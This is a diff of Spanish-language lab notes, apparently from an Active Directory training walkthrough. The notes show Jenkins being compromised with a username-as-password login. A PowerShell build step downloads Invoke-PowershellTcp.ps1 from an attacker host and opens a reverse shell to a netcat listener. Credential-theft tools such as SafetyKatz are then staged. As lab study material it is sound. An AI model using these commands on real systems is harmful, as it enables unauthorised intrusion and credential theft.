@@ -54,15 +54,18 @@ Accederemos al servidor de Jenkins que conocemos que se haya en la IP *172.16.3.
 Nos encontramos que es la versión *2.361.4*, en el panel de People podemos enumerar tres cuentas y antes de hacer fuerza bruta probaremos entre ellas a usar *User as Password* en este caso *builduser::builduser* en el panel de login
 
 Con este usuario se nos permite modificar un proyecto ya existente en la modificación de este, procederemos a acceder a *Configure* -> *Add build step*
-Una vez en esa zona de configuracion nos mandaremos una reverse shell a nuetsra maquina
+Una vez en esa zona de configuración nos mandaremos una reverse shell a nuestra maquina
 ```shell
 powershell iex (iwr -UseBasicParsing http://<attacker_machine>/Invoke-PowershellTcp.ps1);power -Reverse -IPAddress <attacker_machine> -Port 1339
 ```
 
-Una vez tenemos introducido el reverse shell lo guardaremos y ejecutaremos *netcat* poniendonos en escucha en el puerto selecciona
+Una vez tenemos introducido el reverse shell lo guardaremos y ejecutaremos *netcat* poniéndonos en escucha en el puerto selecciona
 ```shell
 C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
 ```
 
 Ejecutaremos *hsf.exe* y cargaremos *Invoke-PowerShellTcp.ps1*
-Y copiaremos la URL ahora en Jenkins haremos clic en Buid Now
+Y copiaremos la URL ahora en Jenkins haremos clic en Buid Now descargándose nuestro *PowerShellTcp* en la maquina victima recibiendo así una conexión en nuestro *Netcat* como el usuario *ciadmin*
+
+Ahora transferiremos al servidor HTTP *hsf.exe* programas como *PowerView, Loader, SfetyKatz y sbloggingbypass*
+Y nos descargaremos los archivos
